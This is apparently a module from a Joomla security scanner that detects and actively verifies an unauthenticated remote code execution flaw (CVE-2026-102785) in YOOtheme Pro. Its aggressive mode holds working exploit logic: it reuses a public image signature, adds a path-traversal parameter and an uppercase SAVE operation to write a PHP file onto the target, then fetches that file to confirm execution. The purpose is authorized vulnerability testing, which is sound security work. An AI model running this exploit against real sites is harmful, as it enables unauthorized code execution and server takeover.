from __future__ import annotations

import html
import re
import secrets
from typing import Any
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-102785"
NAME = "YOOtheme Pro unauthenticated image transformation RCE"
COMPONENT = "YOOtheme Pro"
AFFECTED_RULE = "YOOtheme Pro 5.0.0 through 5.0.52; fixed in 5.0.53"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
IMAGE_URL_RE = re.compile(r'(?:src|srcset|href|data-src)="([^"]*p=cache/[^"]*hash=[a-f0-9]+[^"]*)"', re.IGNORECASE)
MARKER_RE = re.compile(r"PROOFCMS_YOO_RCE_[a-f0-9]+")


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    minimum = parse_version_safe("5.0.0")
    fixed = parse_version_safe("5.0.53")
    if parsed is None or minimum is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if minimum <= parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("yootheme", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="YOOtheme Pro was not detected through its public template manifest or asset paths.", action="No action is required unless YOOtheme Pro is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected YOOtheme Pro {version}, within the affected range below 5.0.53."
        action = "Upgrade YOOtheme Pro to 5.0.53 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected YOOtheme Pro {version}, which includes the image signature/path binding fix."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "YOOtheme Pro was detected, but its version could not be determined."
        action = "Determine the installed YOOtheme Pro version and upgrade to 5.0.53 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _find_image_urls(body: str, base: str) -> list[str]:
    urls: list[str] = []
    for match in IMAGE_URL_RE.finditer(body):
        value = html.unescape(match.group(1))
        for token in value.split():
            if "p=cache/" in token and "hash=" in token:
                urls.append(urljoin(base, token))
    return urls


def _parse_image_url(url: str) -> dict[str, Any] | None:
    parts = urlsplit(url)
    params = dict(parse_qsl(parts.query, keep_blank_values=True))
    if "p" not in params or "hash" not in params or "src" not in params:
        return None
    filename = params["p"].rsplit("/", 1)[-1]
    cachekey = filename.rsplit("-", 1)[-1].split(".", 1)[0]
    if not cachekey:
        return None
    return {
        "url": url,
        "scheme": parts.scheme,
        "netloc": parts.netloc,
        "path": parts.path,
        "params": params,
        "cachekey": cachekey,
    }


def _source_marker(client: HttpClient, base: str, src: str, timeout: int) -> str | None:
    url = urljoin(base, src)
    response = client.get(url, timeout=timeout)
    if is_transport_error(response) or response.get("status") != 200:
        return None
    match = MARKER_RE.search(response.get("body") or "")
    return match.group(0) if match else None


def run_aggressive_probe(
    target_url: str,
    image_url: str | None = None,
    marker: str | None = None,
    path: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Reuse a public image signature to write a JPEG/PHP polyglot outside the cache.

    ``ImageController::verifyHash()`` only binds the image operations returned by
    ``get_class_methods(ImageDriver::class)`` (case-sensitive) and the cache key.
    ``createImage()`` then calls ``method_exists($image, $key)`` (case-insensitive)
    for every query parameter. An uppercase ``SAVE`` parameter is therefore not
    covered by the signature but still invokes ``ImageDriver::save()`` with an
    attacker path. 5.0.52 also uses the unbound route path as the cache target,
    so a traversal path both forces a cache miss and demonstrates the missing
    destination binding. 5.0.53 adds an operation allowlist and requires the
    route path to equal ``LoadImageUrl::getCacheKey()``.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    if not image_url:
        page_url = urljoin(base, path) if path else base
        page = client.get(page_url, timeout=timeout)
        if is_transport_error(page):
            return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=page_url, detail=f"The target page could not be reached ({transport_error_detail(page)}).", action="Retry when the target is reachable.")
        urls = _find_image_urls(page.get("body") or "", base)
        if not urls:
            return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=page_url, detail="No public YOOtheme image transformation URL (p=cache/...&hash=...) was found on the page. Pass --aggressive-arg image_url=<legit URL> on an authorized staging site. Nothing was sent.", action="Point the probe at a page that renders a YOOtheme image.")
        image_url = urls[0]

    parsed = _parse_image_url(image_url)
    if not parsed:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=image_url, detail="The supplied image URL does not contain the expected p/src/hash parameters.", action="Supply a complete YOOtheme image transformation URL.")
    params: dict[str, str] = dict(parsed["params"])
    cachekey = parsed["cachekey"]
    src = params.get("src", "")
    if not marker:
        marker = _source_marker(client, base, src, timeout)
    rand = secrets.token_hex(4)
    write_name = f"proofcms_{rand}.php"
    traversal = f"cache/../../../images/proofcms_{rand}-{cachekey}.php"
    params["p"] = traversal
    params["SAVE"] = f"images/{write_name}"
    query = urlencode(params)
    exploit_url = urlunsplit((parsed["scheme"] or urlsplit(base).scheme, parsed["netloc"] or urlsplit(base).netloc, parsed["path"], query, ""))
    response = client.get(exploit_url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=exploit_url, detail=f"The image transformation request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    rce_url = f"{base}/images/{write_name}"
    rce = client.get(rce_url, timeout=timeout)
    rce_body = rce.get("body") or ""
    file_readable = not is_transport_error(rce) and rce.get("status") == 200
    executed = bool(marker and marker in rce_body and '<?php' not in rce_body)
    uploaded = file_readable and (rce_body[:3] == "\xff\xd8\xff" or "image/" in str((rce.get("headers") or {}).get("Content-Type", "")).lower() or executed)
    evidence = {
        "image_url": image_url,
        "cachekey": cachekey,
        "exploit_url": exploit_url,
        "traversal_path": traversal,
        "write_path": f"images/{write_name}",
        "rce_url": rce_url,
        "exploit_status": response.get("status"),
        "rce_status": rce.get("status") if not is_transport_error(rce) else 0,
        "file_readable": file_readable,
        "marker": marker,
        "executed": executed,
    }
    if executed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=rce_url,
            evidence=evidence,
            detail=(
                "An unauthenticated request reused a public image signature, traversed out of the image cache, "
                f"and wrote {write_name!r} through the unbound SAVE operation. Requesting it executed the embedded "
                f"marker {marker!r}."
            ),
            action="Upgrade YOOtheme Pro to 5.0.53 or newer and remove the uploaded file.",
        )
    if uploaded:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=rce_url,
            evidence=evidence,
            detail=(
                "An unauthenticated request wrote an attacker-named file outside the image cache through the "
                "unbound SAVE operation. The lab did not observe the embedded PHP marker in the response."
            ),
            action="Upgrade YOOtheme Pro to 5.0.53 or newer and remove the uploaded file.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=exploit_url,
        evidence=evidence,
        detail=(
            f"The transformation request returned HTTP {response.get('status')} and the traversal destination "
            f"was not readable at {rce_url!r}."
        ),
        action="Upgrade affected YOOtheme Pro versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    page = HttpClient(timeout=timeout, proxy=proxy).get(base, timeout=timeout)
    if is_transport_error(page):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=base, detail=f"The target could not be reached ({transport_error_detail(page)}).", action="Retry when the target is reachable.")
    urls = _find_image_urls(page.get("body") or "", base)
    if not urls:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=base, detail="No public YOOtheme image transformation URL was found; the write payload was not sent in safe mode.", action="Use aggressive mode with a legitimate image URL on an authorized staging site.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=urls[0], detail="The public image transformation endpoint is reachable; the SAVE payload was not sent in safe mode.", action="Use aggressive mode on an authorized staging site to verify the signature/path binding.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because YOOtheme Pro was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            image_url=aggressive_value(aggressive_args, aggressive_command, "image_url"),
            marker=aggressive_value(aggressive_args, aggressive_command, "marker"),
            path=aggressive_value(aggressive_args, aggressive_command, "path"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (image URL discovery) and aggressive (signature reuse/write) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Remote Code Execution", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["yootheme"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-102785", "https://www.yootheme.com", "https://mysites.guru/vulnerabilities/CVE-2026-102785"]}
